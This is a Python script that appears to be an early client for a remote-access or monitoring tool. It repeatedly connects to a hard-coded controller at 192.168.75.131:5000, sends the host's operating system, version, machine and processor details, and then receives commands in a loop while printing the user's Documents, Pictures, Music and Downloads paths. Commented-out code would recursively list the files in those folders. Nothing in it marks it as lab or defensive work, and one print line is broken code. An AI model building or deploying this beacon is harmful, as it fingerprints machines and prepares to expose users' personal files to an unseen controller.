import socket
import platform
from pathlib import Path

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

masterMonitering = False
while(masterMonitering != True):
    try:
        client.connect(("192.168.75.131", 5000))
        masterMonitering = True;
    except(ConnectionRefusedError):
        masterMonitering = False;

l = [platform.system(), platform.release(), platform.version(), platform.machine(), platform.processor()]
for i in range(len(l)):
    try:
        client.send(l[i].encode())
    except(ConnectionAbortedError,ConnectionResetError,ConnectionRefusedError):
        print("Server msg:" ,ConnectionAbortedError | ConnectionResetError | ConnectionRefusedError |BrokenPipeError)
while True:
    data = client.recv(1024)
    
    # if message == "bye":
    #     break
    # try:
    #     client.send(message.encode())
    # except(ConnectionAbortedError,ConnectionResetError,ConnectionRefusedError,BrokenPipeError):
    #     print("No Master is avilable")

    home = Path.home()

    documents = home / "Documents"
    pictures = home / "Pictures"
    music = home / "Music"
    downloads = home / "Downloads"

    print("Home:", home)
    print("Documents:", documents)
    print("Pictures:", pictures)
    print("Music:", music)
    print("Downloads:", downloads)
    # for item in home.rglob("*"):
    #         print(item)


    # for item in home.rglob("*"):
    #         print(item)
    # for item in documents.rglob("*"):
    #         print(item)
    # for item in pictures.rglob("*"):
    #         print(item)
    # for item in music.rglob("*"):
    #         print(item)
    # for item in downloads.rglob("*"):
    #         print(item)

    print("Server:", data.decode())

client.close()